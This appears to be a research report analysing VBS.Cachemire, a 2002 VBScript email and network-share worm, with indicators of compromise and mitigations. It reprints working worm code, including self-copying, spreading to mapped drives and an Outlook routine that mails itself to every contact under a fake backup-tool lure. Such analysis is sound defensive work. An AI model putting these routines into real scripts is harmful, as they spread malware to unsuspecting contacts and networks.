# 🛡️ Malware Analysis Report: VBS.Cachemire

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-Email%20Worm%20(VBS)-red)
![Creation Date](https://img.shields.io/badge/created-2002--06--19-orange)

## Overview

VBS.Cachemire is a Visual Basic Script email/network worm by PetiK dated around June 19, 2002. It copies itself to the System directory as `MsBackup.vbs`, creates a Desktop shortcut as lure, attempts to spread via Outlook mass-mailing and to mapped network drives, and (on a randomized trigger) opens Notepad and types taunting text. The script also contains several coding mistakes that would affect execution flow in the wild.

Artifacts in this folder:
- `cachemire.vbs` — worm source code

> Disclaimer: This is a historical malware analysis for research/education. Do not execute malware outside of a lawful, isolated lab environment.

## Execution Flow and Installation

On execution, the worm resolves common folders and reads its own source (into `wrm`). If it isn’t already running from `%System%\\MsBackup.vbs`, it shows a fake alert, copies itself there, and sets up an attraction shortcut on the Desktop.

```vb
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws  = CreateObject("WScript.Shell")
Set win = fso.GetSpecialFolder(0)
Set sys = fso.GetSpecialFolder(1)
desk   = ws.SpecialFolders("Desktop")

If WScript.ScriptFullName <> sys & "\MsBackup.vbs" Then
  MsgBox "Sorry but the file '" & WScript.ScriptName & "' is not a valid VBS file", vbCritical, "ALERT"
  fso.GetFile(WScript.ScriptFullName).Copy sys & "\MsBackup.vbs"
  ' ws.RegWrite "HKLM\...\Run\MsBackup", sys & "\MsBackup.vbs"  ' (commented out)

  ' Create Desktop shortcut
  Set lnk = ws.CreateShortcut(desk & "\Surprise.lnk")
  lnk.TargetPath = sys & "\MsBackup.vbs"
  lnk.WindowStyle = 1
  lnk.Hotkey = "CTRL+SHIFT+F"
  lnk.IconLocation = "wscript.exe, 0"
  lnk.Description = "Surprise"
  lnk.WorkingDirectory = sys
  lnk.Save
End If
```

Notes:
- Persistence via Run key is present but commented out in the sample.
- The shortcut “Surprise.lnk” points to the copy in the System directory.

## Network Propagation (Mapped Drives)

It generates a random 8-letter lowercase filename with `.vbs` and attempts to copy itself to all mapped network drives via `WScript.Network.EnumNetworkDrives`.

```vb
Sub spreadnetwrk(nname)
  Set drve = ntw.EnumNetworkDrives
  If drve.Count > 0 Then
    For j = 0 To drve.Count - 1
      If drve.Item(j) <> "" Then
        fso.GetFile(WScript.ScriptFullName).Copy drve.Item(j) & "\" & nname
      End If
    Next
  End If
End Sub
```

Bug note: In the main path, the filename generation block is followed by a stray `Loop` with no matching `Do`, which would raise a runtime error and likely prevent `spreadnetwrk` from being called as intended.

## Email Propagation (Outlook)

A routine exists to mass-mail the worm as an attachment to Outlook address lists, with backup-themed social engineering.

```vb
Sub spreadout()
  Set A = CreateObject("Outlook.Application")
  Set B = A.GetNameSpace("MAPI")
  For Each C In B.AddressLists
    If C.AddressEntries.Count <> 0 Then
      For D = 1 To C.AddressEntries.Count
        Set F = A.CreateItem(0)
        F.To      = C.AddressEntries(D).Address
        F.Subject = "Backup your system..."
        F.Body    = "Use this tool to create a backup of your system..."
        F.Attachments.Add sys & "\MsBackup.vbs"
        F.DeleteAfterSubmit = True
        If F.To <> "" Then F.Send
      Next
    End If
  Next
End Sub
```

Notes:
- In the provided flow, `spreadout` is never properly invoked due to malformed control flow (see next section). If called, it would email `MsBackup.vbs` to all contacts.

## Payload: Notepad Typing (Random Trigger)

Within the `Else` branch intended for the already-installed state, a randomized day check triggers a Notepad window and types messages with `SendKeys`.

```vb
If Day(Now) = Int((31 * Rnd) + 1) Then
  ws.Run "notepad.exe"
  WScript.Sleep 200
  ws.SendKeys "Date : " & Date & vbLf
  ws.SendKeys "Time : " & Time & crlf
  x = 0
  Do Until x = 6
    num = Int((6 * Rnd) + 1)
    If num = 1 Then
      mess = "You're infected by my new VBS virus..." & vbCrLf
    ElseIf num = 2 Then
      mess = "Why do you click unknown file ??" & crlf
    ' ...other messages (PetiK/[b8], AV advice, etc.) ...
    End If
    For i = 1 To Len(mess)
      ws.SendKeys Mid(mess, i, 1)
      WScript.Sleep 50
    Next
    x = x + 1
  Loop
End If
```

The surrounding logic appears broken:
- `y = 0` then a `Do Until y = Day(Now)` block tries to wrap a `Sub spreadout()` definition incorrectly, followed by `y = y + 1`. This would not run as intended and suggests an authoring error or damaged copy-paste.

## Notable Coding Issues

- `On Error Resume Next` is commented out at the top, making the script fragile.
- A stray `Loop` appears after filename generation, causing syntax/runtime errors.
- `Sub spreadout()` is nested improperly inside what seems intended to be a loop—invalid in VBS.
- Some variables like `strp` (Startup path) are declared but never used.

These issues likely reduced real-world propagation unless fixed variants circulated.

## Indicators of Compromise (IoCs)

- Files/shortcuts:
  - `%System%\MsBackup.vbs`
  - `%UserProfile%\Desktop\Surprise.lnk` → `%System%\MsBackup.vbs`
  - Random copies on mapped network drives: `\\<share>\<drive>\<8letters>.vbs`
- Email activity (if routine invoked): messages titled "Backup your system..." with `MsBackup.vbs` attached.

## Mitigation

- Block COM automation of Outlook from scripts; audit sent mail for VBS attachments.
- Monitor `%System%` for unauthorized `.vbs` creations and Desktop for suspicious shortcuts.
- Disable WSH for untrusted users or enforce signed scripts policy.
- Monitor mapped drive writes of `.vbs` by user workstations.
- Use endpoint protection with script scanning and AMSI integration.

## Notes

VBS.Cachemire blends social engineering ("backup" tool + desktop shortcut "Surprise") with email and network-share propagation. However, apparent coding errors (stray `Loop`, misplaced subroutine) suggest this version may be a rough draft or partially broken copy, reducing its effectiveness without manual fixes.
